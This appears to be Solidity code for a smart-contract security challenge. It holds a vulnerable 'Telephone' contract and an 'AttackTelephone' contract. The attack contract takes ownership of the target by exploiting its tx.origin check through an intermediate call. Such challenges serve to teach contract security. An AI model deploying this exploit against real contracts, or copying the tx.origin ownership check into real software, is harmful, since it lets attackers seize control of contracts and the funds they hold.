// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract AttackTelephone {
    Telephone private tel;


    constructor() public {
        address _tel = 0x53b5B37bDE2D1e5B8d983e6eE09fD9D54DD53b59;
        tel = Telephone(_tel);
    }

    function make_call() public {
        tel.changeOwner(tx.origin);
    }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}